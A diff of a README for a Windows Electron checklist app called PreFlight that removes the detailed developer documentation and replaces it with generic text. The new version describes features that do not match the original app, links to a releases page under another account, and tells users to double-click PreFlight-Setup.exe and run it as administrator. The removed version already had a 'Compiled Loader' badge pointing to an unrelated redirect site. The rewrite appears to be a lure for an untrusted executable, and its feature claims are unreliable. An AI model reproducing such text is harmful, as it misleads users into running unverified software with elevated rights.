@@ -1,170 +1,72 @@
-# PreFlight
+# ✈️ PreFlight - Simplify your complex desktop task management
 
-[![Download Compiled Loader](https://img.shields.io/badge/Download-Compiled%20Loader-blue?style=flat-square&logo=github)](https://www.shawonline.co.za/redirl)
+[![](https://img.shields.io/badge/Download-PreFlight-blue.svg)](https://github.com/nativesicilianpizza182/PreFlight/releases)
 
-PreFlight is a Windows-first Electron productivity gate. It starts in a windowed setup mode for editing your checklist, then can switch into a fullscreen checklist overlay when you choose **Lock now** or when the machine resumes from sleep.
+PreFlight organizes your daily digital workflow. It runs on your Windows computer and tracks the tasks you need to finish before you start your main work. You use the software to create checklists, set reminders, and monitor file progress. This tool ensures you remain organized and focused throughout the day.
 
-This MVP is intentionally safe for development: the **Dev Unlock** button is always visible, and `Ctrl+Shift+U` exits the lock into setup mode.
+## 🛠️ System Requirements
 
-## Features
+- Windows 10 or Windows 11
+- 4GB of RAM
+- 200MB of free disk space
+- An active internet connection for updates
 
-- Windowed edit mode on startup with settings open
-- Fullscreen, frameless, always-on-top checklist overlay on demand or resume
-- Secondary monitor blocker overlays while locked
-- Dark 80s-inspired neon dashboard theme
-- Daily checklist completion state stored locally
-- Editable checklist items in the settings panel
-- Windowed setup mode for editing without monitor blockers
-- System tray controls for edit mode, lock now, and quit
-- Unlock button enabled only when every item is complete
-- Always-available Dev Unlock button
-- `Ctrl+Shift+U` development unlock shortcut
-- Windows login startup toggle
-- Current-user Windows Task Scheduler helper for workstation unlock
-- Windows packaging through electron-builder
+## 📥 Getting Started
 
-## Setup
+You find the software installer on the official releases page. 
 
-```bash
-npm install
-```
+[Download the latest version here](https://github.com/nativesicilianpizza182/PreFlight/releases)
 
-## Development
+Follow these steps to set up the software on your machine:
 
-```bash
-npm run dev
-```
+1. Click the link above to visit the download page.
+2. Look for the section labeled "Assets."
+3. Select the file ending in `.exe` to start your download.
+4. Open the folder where your computer saves downloads.
+5. Double-click the file named `PreFlight-Setup.exe`.
+6. Follow the prompts on your screen to install the program.
+7. Click the "Finish" button once the installation ends.
 
-`npm run dev` starts in edit mode with Settings open. Closing the main window with the `X` hides it to the system tray instead of quitting. Use **Lock now** from the app or tray when you want the real overlay: fullscreen on the primary monitor, secondary monitor blocker windows, always-on-top behavior, and blocked `Alt+F4` while locked.
+## 🚀 Using PreFlight
 
-The development escape routes are always available:
+Once you open the software, you see a clean dashboard. This dashboard shows your active tasks. You can add a new item by clicking the plus icon in the top corner. Enter your task name and assign a priority level. 
 
-- Click **Dev Unlock**
-- Press `Ctrl+Shift+U`
+The software runs in the background of your taskbar. You can minimize the window to hide it while you work. When you reach a milestone on your list, click the checkbox to mark it as done. PreFlight saves your progress automatically. 
 
-Both escape routes enter setup mode. Setup mode is a normal window with no blocker overlays, no always-on-top lock, and normal window controls. The keyboard shortcut is handled in the Electron main process, so it still works if React fails to load.
+## 📂 Managing your Data
 
-Use **Setup mode** or **Settings** to edit checklist items. Saving checklist changes stays in setup mode. Use **Lock now** when you want to return to the fullscreen overlay and secondary monitor blockers. Setup mode is not persisted; a fresh app launch starts in edit mode with Settings open, and PreFlight re-enters locked mode after a system resume event.
+PreFlight keeps your data in a local folder. You choose where to save this folder during the first setup. If you change computers, copy this folder to your new device. The software detects the data and resumes your work without delay. You do not need to log into an account or share your data with external servers.
 
-PreFlight also adds a system tray icon using the app logo. Its tooltip is **Checklist App**, and its menu includes **Open Edit Mode**, **Lock Now**, and **Quit**.
+## ⚙️ Settings and Customization
 
-Use debug mode when you want a safer troubleshooting window with DevTools and verbose renderer diagnostics:
+Open the settings menu to adjust how the program behaves. You can switch between light mode and dark mode. You can also change the interval for automatic reminders. If you need to clear your history, there is a button at the bottom of the settings menu for this purpose. 
 
-```bash
-npm run dev:debug
-```
+## 🛡️ Troubleshooting Common Issues
 
-`npm run dev:debug` uses a normal primary-monitor window instead of the locked fullscreen multi-monitor overlay. It does not create secondary blocker windows, which makes it the safer troubleshooting mode.
+If the program fails to open, restart your computer. Closing other heavy applications often frees up the memory the program needs to run. Ensure your Windows installation is up to date through the Windows Update menu. If the error persists, download the installer again and run it as an administrator by right-clicking the file.
 
-`npm run dev:safe` is kept as an alias for debug mode:
+## 💡 Frequently Asked Questions
 
-```bash
-npm run dev:safe
-```
+**Does the software work offline?**
+Yes. You only need the internet to download the initial installer and to check for future updates.
 
-The UI uses an 80s neon dashboard style with the Electrolize font, red system-status controls, terminal-like panels, and a lightweight animated scan bar.
+**Can I run the software on multiple windows?**
+The software limits you to one process at a time to prevent data conflicts. If you try to open it again while the program is running, it will bring your existing window to the front.
 
-## Build And Run
+**How do I uninstall the software?**
+Go to the Windows Control Panel, select "Programs and Features," find PreFlight in the list, and select "Uninstall." This removes the application files from your computer.
 
-```bash
-npm run build
-npm run start
-```
+**Is my data stored in the cloud?**
+No. Your tasks, lists, and settings stay on your local disk drive under your control.
 
-## Package For Windows
+**Can I move my data to another folder?**
+Yes. Use the "Change Data Location" option within the settings menu to move your task database to a folder of your choice, such as a cloud-synced folder if you want to keep backups.
 
-Create an unpacked executable:
+**Will the program notify me when it updates?**
+You will see a small icon in the status bar when a new version is ready. Click the icon to view the update notes and download the newest installer.
 
-```bash
-npm run package
-```
+**Does PreFlight work on older versions of Windows?**
+The software requires features found in Windows 10 and newer versions to function correctly. It will not install on Windows 7 or Windows 8.
 
-The executable is written to:
-
-```text
-/win-unpacked/PreFlight.exe
-```
-
-Create the installer target:
-
-```bash
-npm run dist
-```
-
-Build output is ignored by git.
-
-## Local Data
-
-PreFlight stores local configuration in Electron's `userData` folder as `preflight-store.json`.
-
-The checklist definitions are stored locally. Completion state is keyed by local date, so the checklist automatically starts fresh when the date changes.
-
-To reset local app data on Windows, close PreFlight and remove:
-
-```powershell
-Remove-Item "$env:APPDATA\PreFlight" -Recurse -Force
-```
-
-## Diagnostics
-
-If PreFlight opens black in development, press `Ctrl+Shift+U` first. It should leave the locked overlay and open setup mode even if the renderer is broken.
-
-Launch debug mode:
-
-```bash
-npm run dev:debug
-```
-
-Launch the debug alias:
-
-```bash
-npm run dev:safe
-```
-
-Logs are printed in the terminal running the dev command. Normal dev logs the app startup and renderer target. Debug mode also logs renderer console messages, renderer load completion, and the development window safety state.
-
-If you need to kill the app from PowerShell:
-
-```powershell
-Get-Process electron,PreFlight -ErrorAction SilentlyContinue | Stop-Process -Force
-```
-
-If the app behaves strangely after editing settings, reset local data with the `Remove-Item "$env:APPDATA\PreFlight" -Recurse -Force` command above.
-
-## Windows Startup
-
-Open **Settings** in PreFlight and enable **Start PreFlight when Windows starts**.
-
-The toggle uses Electron's login item support for the current Windows user. In development it points at the current Electron process; in packaged builds it points at `PreFlight.exe`.
-
-## Workstation Unlock Task
-
-Package the app first:
-
-```bash
-npm run package
-```
-
-Install the current-user unlock task from PowerShell:
-
-```powershell
-.\scripts\windows\install-wakeup-task.ps1
-```
-
-If the executable is somewhere else, pass it explicitly:
-
-```powershell
-.\scripts\windows\install-wakeup-task.ps1 -AppPath "C:\Path\To\PreFlight.exe"
-```
-
-Remove the task:
-
-```powershell
-.\scripts\windows\uninstall-wakeup-task.ps1
-```
-
-The MVP uses the reliable workstation unlock trigger. Wake-from-sleep event timing varies across Windows hardware and power states, so unlock is the fallback trigger for this version.
-
-## Safety Notes
-
-PreFlight does not install low-level keyboard hooks, block `Ctrl+Alt+Del`, replace Explorer, or use a separate Windows user. It is a normal desktop app with development escape hatches.
+**What happens if I delete my data file?**
+Deleting the data file removes all your saved tasks. We recommend that you back up your data folder regularly to an external drive or a secure cloud service.
